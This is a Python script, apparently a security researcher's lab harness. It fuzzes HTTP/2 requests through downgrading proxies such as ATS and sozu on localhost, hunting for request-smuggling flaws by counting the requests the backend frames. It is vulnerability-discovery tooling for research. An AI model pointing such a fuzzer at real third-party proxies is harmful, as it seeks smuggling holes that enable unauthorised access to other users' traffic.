"""Evolutionary H2 -> H1 downgrade hunt. Fire a genome as HTTP/2 to a downgrading
proxy (ATS/sozu); a smuggle = the backend (conn_bk) frames >= 2 requests from the
one H2 request the proxy acknowledged. All 32 operators, stigmergy + anneal, ddmin
each hit. SENTINEL FIRST: a benign H2 POST must frame exactly 1 REQ, and the malformed
standalone-END_STREAM must frame 0 (rejected), else the oracle is blind.

usage: python h2_hunt.py <port> <sni> <label> [generations] [seeds]"""
import os
import random
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from phage.evo import genome as G
from phage.evo.driver_h2 import send_h2
from phage.evo.gates import stabilized
from phage.evo.differential import malformation_descriptor
from phage.evo.oracle import Observation
from phage.evo.runner import search

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4443
SNI = sys.argv[2] if len(sys.argv) > 2 else "lab"
LABEL = sys.argv[3] if len(sys.argv) > 3 else "ATS"
BK = "logs/conn_bk.log"


def bk_size():
    try:
        return os.path.getsize(BK)
    except OSError:
        return 0


def bk_reqs(off):
    try:
        with open(BK, "rb") as f:
            f.seek(off)
            return sum(1 for l in f.read().split(b"\n") if l.startswith(b"REQ "))
    except OSError:
        return 0


def run_case(g):
    off = bk_size()
    cli, clean = send_h2(HOST, PORT, g, timeout=4.0, sni=SNI)
    time.sleep(0.25)
    reqs = bk_reqs(off)
    if reqs >= 2:
        return Observation(request_count=reqs)  # backend framed extra req(s) = smuggle
    if not cli:
        return Observation(request_count=0, error=True)
    return Observation(request_count=1 if reqs == 1 else 0)


PRE = [(b":scheme", b"https"), (b":authority", b"lab")]


def seed():
    return [
        G.Headers(tuple([(b":method", b"POST"), (b":path", b"/")] + PRE
                        + [(b"content-length", b"4")]), end_stream=False),
        G.Data(b"AAAA", end_stream=True),
    ]


if __name__ == "__main__":
    # SENTINEL: benign frames 1; standalone-END_STREAM (CL:10 no body) frames 0.
    o1 = bk_size()
    send_h2(HOST, PORT, [G.Headers(tuple([(b":method", b"GET"), (b":path", b"/s")]
            + PRE), end_stream=True)], sni=SNI)
    time.sleep(0.3)
    benign = bk_reqs(o1)
    o2 = bk_size()
    send_h2(HOST, PORT, [G.Headers(tuple([(b":method", b"POST"), (b":path", b"/s")]
            + PRE + [(b"content-length", b"10")]), end_stream=True)], sni=SNI)
    time.sleep(0.3)
    malformed = bk_reqs(o2)
    print(f"SENTINEL[{LABEL}]: benign={benign} (want 1)  standalone-END_STREAM="
          f"{malformed} (want 0)", flush=True)
    if benign != 1:
        print("SENTINEL FAIL: channel not proven. Stop.")
        sys.exit(1)

    rc = stabilized(run_case, n=3)
    HITS = []

    def logged(g):
        o = rc(g)
        if o.request_count >= 2:
            HITS.append(g)
        return o

    gens = int(sys.argv[4]) if len(sys.argv) > 4 else 30
    seeds = [int(x) for x in (sys.argv[5] if len(sys.argv) > 5 else "1,2,3").split(",")]
    for sd in seeds:
        search(logged, random.Random(sd), generations=gens,
               baseline=seed(), expected=1, descriptor_fn=malformation_descriptor,
               stigmergy=True, anneal=True, neutral_drift=True, use_corpus=False,
               grammar_seeds=0)
        print(f"  seed {sd}: {LABEL} H2 smuggle candidates so far = {len(HITS)}",
              flush=True)
    print(f"\nDONE [{LABEL}]. H2->H1 smuggle candidates: {len(HITS)}", flush=True)
    for g in HITS[:5]:
        print(f"  HIT: {G.descriptor(g)} {g}", flush=True)
